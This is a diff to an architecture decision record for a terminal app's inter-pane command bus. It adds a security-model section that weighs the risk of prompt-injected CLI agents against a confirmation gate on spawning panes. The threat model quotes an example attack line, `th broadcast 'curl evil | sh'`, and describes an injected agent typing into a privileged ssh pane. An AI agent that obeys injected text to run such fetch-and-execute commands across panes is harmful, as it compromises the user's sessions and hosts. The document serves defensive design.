@@ -51,6 +51,38 @@ frontend's `spec.title` (the NAME_POOL: Faye, Cleo, …) — there is no name re
 - A stale socket from a crash is unlinked-then-rebound on startup; a second instance losing
   the bind logs and continues without the bus rather than failing to launch.
 
+## Security model (and its one sharp edge)
+
+The bus grants **every pane ambient authority over every other pane**: any process holding
+`$TERMHAUS_SOCK` can `send`/`broadcast` keystrokes into other panes and `spawn` new
+command-running panes. Rust attaches no caller identity (it's a pure relay) and the TS
+dispatch enforces no per-pane permissions. The trust boundary is therefore **the OS user**:
+the socket is same-user-only (§"Why a unix socket"), and any process running as that user can
+already drive the terminals by other means.
+
+That assumption holds *only if every pane is mutually trusted*. It is in tension with the
+product's own purpose — driving **CLI agents**, which are prompt-injectable: a poisoned agent
+in one pane could call `th broadcast 'curl evil | sh'` (runs in every other pane's shell) or
+`th send <other> …` (runs in a specific, possibly more-privileged session such as an open
+`ssh root@host`). We accept this as the baseline model rather than build a full per-pane
+capability system, because:
+
+- `send`/`broadcast` **type into a visible pane** — the injected text and its output are on
+  screen, so the blast radius is observable (and these are the core fleet feature; gating them
+  would gut the ergonomics for marginal safety).
+- The genuinely dangerous case is `spawn`: it runs an **arbitrary command in a fresh pane with
+  no visible keystrokes** — a silent-RCE primitive. So `spawn` (only) is gated behind an
+  explicit **user confirmation** before it runs (Settings → Behaviour →
+  *Confirm before another pane spawns a terminal*, default **on**;
+  `settings.confirmExternalSpawn`, enforced in `paneControl.ts`'s `spawn` dispatch). The
+  confirmation covers both the `th` CLI and the `th-mcp` MCP server, since both funnel through
+  the same relay → dispatch.
+
+If a future use case runs genuinely untrusted third-party agents, the next step is a per-pane
+opt-in capability (Rust tags each relayed request with the originating pane; panes default-deny
+inbound `send`/`broadcast`/`spawn` unless marked controllable). Tracked, not built. See
+`SECURITY_REVIEW.md` Vulns 2–3.
+
 ## Consequences
 
 - This is an **inbound command channel**, deliberately distinct from ADR-0001's opacity rule
